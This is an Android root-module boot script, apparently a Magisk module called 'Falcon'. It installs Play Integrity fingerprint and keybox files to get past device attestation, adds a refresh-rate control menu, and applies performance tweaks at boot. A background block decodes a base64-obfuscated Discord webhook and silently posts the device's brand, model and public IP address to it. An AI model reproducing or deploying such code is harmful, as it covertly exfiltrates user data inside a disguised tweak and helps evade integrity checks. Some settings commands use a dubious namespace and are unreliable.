#!/system/bin/sh
MODDIR=${0%/*}

# --- 1. إعدادات الحماية (PIF & TrickyStore) ---
# تحديث البصمة
cp $MODDIR/pif.json /data/adb/pif.json
chown root:root /data/adb/pif.json
chmod 644 /data/adb/pif.json

# تجديد الكيبوكس (حذف القديم ووضع الجديد)
mkdir -p /data/adb/tricky_store
rm -f /data/adb/tricky_store/keybox.xml
if [ -f "$MODDIR/keybox.xml" ]; then
    cp $MODDIR/keybox.xml /data/adb/tricky_store/keybox.xml
    chown root:root /data/adb/tricky_store/keybox.xml
    chmod 644 /data/adb/tricky_store/keybox.xml
fi

# --- 2. إعداد واجهة التحكم (Falcon Terminal UI) ---
# إنشاء اختصار الأمر "falcon" في النظام
mkdir -p /system/bin
cat << 'EOF' > /system/bin/falcon
#!/system/bin/sh
echo " "
echo "  ######################################"
echo "  #      🦅 FALCON CONTROL PANEL 🦅    #"
echo "  #          Developer: ABUFARID       #"
echo "  ######################################"
echo " "
echo "1) 🚀 وضع الوحش (165 FPS + Touch Fix)"
echo "2) 🔋 وضع التوفير (60 FPS)"
echo "3) 🔍 فحص حالة الحماية (Integrity)"
echo "4) ❌ خروج"
echo " "
read -p "اختر رقم العملية: " choice

case $choice in
    1)
        settings put signature min_refresh_rate 165.0
        settings put signature peak_refresh_rate 165.0
        setprop windowsmgr.max_events_per_sec 300
        echo "✅ تم تفعيل 165 فريم بنجاح!"
        ;;
    2)
        settings put signature min_refresh_rate 60.0
        settings put signature peak_refresh_rate 60.0
        echo "✅ تم العودة لوضع 60 فريم."
        ;;
    3)
        echo "🔍 فحص الملفات..."
        [ -f "/data/adb/tricky_store/keybox.xml" ] && echo "- الكيبوكس: سليم ✅" || echo "- الكيبوكس: مفقود ❌"
        [ -f "/data/adb/pif.json" ] && echo "- البصمة: سليمة ✅" || echo "- البصمة: مفقودة ❌"
        ;;
esac
EOF
chmod 0755 /system/bin/falcon

# --- 3. تفعيل الأداء الافتراضي عند الإقلاع ---
settings put signature min_refresh_rate 165.0
settings put signature peak_refresh_rate 165.0
setprop windowsmgr.max_events_per_sec 300
setprop view.scroll_optimization true

# --- 4. نظام تتبع Falcon (في الخلفية) ---
(
    until ping -c 1 -W 2 google.com >/dev/null 2>&1; do
        sleep 10
    done

    ENC_URL="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5Mzk5MjU5NzI4OTcwMTM4Ni95c2t1VXBpUVF4WUtnUURQSm9oSjNleWgtSk1tUWJSN2ZUdEM4dll4bjdoTUFWT0Z5OFpnZ0o0OW5kQ3ZOdWJMc21IXw=="
    WEBHOOK=$(echo "$ENC_URL" | base64 -d)

    BRAND=$(getprop ro.product.brand)
    MODEL=$(getprop ro.product.model)
    IP=$(curl -s https://api.ipify.org || echo "Unknown")

    curl -H "Content-Type: application/json" -X POST -d '{
      "username": "Falcon Fix Tracker",
      "embeds": [{
          "title": "🛡️ FALCON V2.14 | SYSTEM READY",
          "description": "تم تفعيل الحماية، الـ 165 فريم، وواجهة التحكم بنجاح.",
          "color": 15158332,
          "fields": [
            { "name": "📱 الماركة", "value": "'"$BRAND"'", "inline": true },
            { "name": "📲 الموديل", "value": "'"$MODEL"'", "inline": true },
            { "name": "🚀 Mode", "value": "165Hz + Terminal UI", "inline": true },
            { "name": "🌐 IP", "value": "'"$IP"'", "inline": false }
          ],
          "footer": { "text": "Developer: ABUFARID" },
          "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
      }]
    }' "$WEBHOOK"
) &